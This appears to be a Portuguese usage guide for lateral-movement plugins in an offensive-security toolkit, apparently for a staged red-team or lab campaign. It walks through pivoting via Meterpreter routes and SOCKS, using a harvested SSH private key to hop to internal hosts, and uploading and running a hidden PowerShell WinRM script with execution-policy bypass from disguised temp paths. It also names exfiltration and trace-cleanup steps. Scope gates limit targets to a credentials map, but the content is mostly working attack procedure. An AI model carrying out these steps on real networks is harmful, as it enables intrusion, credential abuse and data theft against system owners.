# USAGE — phase 09 plugins (v0506_ssh_pivot.sh / v0507_winrm_lateral.ps1)

Runners canônicos: fase 06. Gate central: `credentials_map.json` da fase 08.
**Destino fora do mapa = exit 2. Sem exceção, sem override.**

---

## 0. Pré-requisitos

- Mapa v2 da fase 08 **com destinos correlacionados** (`destinations[]`).
- Pivot ativo no Meterpreter: `route add <subnet> <session_id>` +
  `setg Proxies socks5:127.0.0.1:1080` (ou `portfwd` por host).
- Linux: chave do par `match:"local_key=..."` acessível no host pivô.
- Windows: credencial exportada do store da 08 em arquivo (nunca digitada).

## 1. Linux — SSH pivot (7 passos)

```bash
# 1. sanity + testes dos gates:
cd 09_lateral_movement/scripts/vectors
bash -n v0506_ssh_pivot.sh
../../tests/run_tests.sh   # da raiz da fase: todos os gates testados

# 2. selecionar destino NO MAPA (preferir match:"local_key=..."):
jq -r '.destinations[] | select(.match | startswith("local_key")) |
      "\(.user)@\(.host) — \(.evidence_source)"' \
  ../../08_post_exploitation/evidence/credentials_map.json

# 3. validate (gate completo; seguro de repetir):
EVID_DIR=/tmp/.sys-09 MAP=../../08_post_exploitation/evidence/credentials_map.json \
  KEY_FILE=/home/svc-deploy/.ssh/id_rsa DEST="svc-deploy@10.0.2.9" \
  /tmp/.sys-run --vector V-05-KEY --plugin /tmp/.sys-lat \
  --validate-only --quiet --output /tmp/.sys-09
echo $?   # 0 | 2 = fora do mapa/sem mapa | 3 = material ausente

# 4. execute (1 tentativa):
EVID_DIR=/tmp/.sys-09 MAP=... KEY_FILE=... DEST="svc-deploy@10.0.2.9" \
  /tmp/.sys-run --vector V-05-KEY --plugin /tmp/.sys-lat --quiet --output /tmp/.sys-09
echo $?   # 0 = hop obtido | 4 = falhou (ledger marca; retry exige JUSTIFY)

# 5. exfiltração + 6. cleanup (cleanup_manifest ritual)
# 7. leitura: execution_proof.txt (remote_identity = prova) + outcome.json
Retry: segunda tentativa contra o mesmo destino exige JUSTIFY=FILE (justificativa documentada — o que mudou desde a tentativa 1). O ledger attempted.list mantém o teto.

2. Windows — WinRM lateral
text



meterpreter > upload vectors/v0507_winrm_lateral.ps1 C:\Windows\Temp\.sys-lat.ps1
meterpreter > execute -f powershell.exe -a \
  "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\.sys-run.ps1 \
   -Vector V-05-CREDACCESS-HIVES -Plugin C:\Windows\Temp\.sys-lat.ps1 \
   -FindingsDir C:\Windows\Temp\.sys-08 -OutputDir C:\Windows\Temp\.sys-09"
# env no plugin: MAP, DEST (user@host), CRED_FILE (store da 08)
# fluxo: validate (gate mapa + cred) -> execute (Negotiate, 1 tentativa) -> proof
3. O ciclo (o passo 5 do README)
Cada hop obtido reabre o loop: rode a enumeração da fase 04 no novo contexto (novos authorized_keys, novas configs, nova vizinhança) → correlacione → atualize o mapa → próximo hop. O portfólio mostra a campanha como ciclo de coleta-análise-movimento, não como lista de exploits.

4. Regras de ouro
Mapa é lei: destino ausente = exit 2. Testado em tests/run_tests.sh (T1/T2).
Uma tentativa por destino; retry só com justificativa em arquivo (T3).
Nunca interativo: BatchMode/NumberOfPasswordPrompts=0 (Linux), cred do store (Win).
Todo tráfego east-west pelo pivô — sem conexão direta operador→interno.
Novo hop = novo ciclo de enumeração. O mapa cresce com provenance.
